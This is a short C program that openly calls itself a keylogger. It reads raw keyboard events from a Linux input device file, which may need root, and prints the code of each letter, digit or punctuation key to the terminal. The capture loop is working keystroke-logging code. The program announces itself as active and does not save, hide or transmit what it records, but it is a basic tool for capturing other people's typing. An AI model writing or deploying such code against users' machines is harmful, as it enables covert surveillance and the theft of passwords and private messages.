#include <bits/types.h>
#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    if (argc != 2) {
        fprintf(stderr, "keylogger:\n\tUsage %s <event-file>\n", argv[0]);
        exit(-69);
    }

    int fd = open(argv[1], O_RDONLY, 0);

    if (fd == -1) {
        fprintf(stderr,
                "keylogger:\n\tError: couldn't open file (you man need to "
                "open it as "
                "root)\n");
        exit(-69);
    }
    printf(
        "keylogger:\n\tLog: Key logger is active...\n\tLog: Reading from %s\n",
        argv[1]);

    struct input_event ie;

    while (1) {
        read(fd, &ie, sizeof(ie));

        int is_1_to_equal = ie.code >= KEY_1 && ie.code <= KEY_EQUAL ? 1 : 0;
        int is_q_to_rightbrace =
            ie.code >= KEY_Q && ie.code <= KEY_RIGHTBRACE ? 1 : 0;
        int is_a_to_apos =
            ie.code >= KEY_A && ie.code <= KEY_APOSTROPHE ? 1 : 0;
        int is_z_to_slash = ie.code >= KEY_Z && ie.code <= KEY_SLASH ? 1 : 0;

        if (is_1_to_equal || is_q_to_rightbrace || is_a_to_apos ||
            is_z_to_slash)
            printf("keylogger:\n\tLog: value: %d\n", ie.code);
    }

    return 0;
}
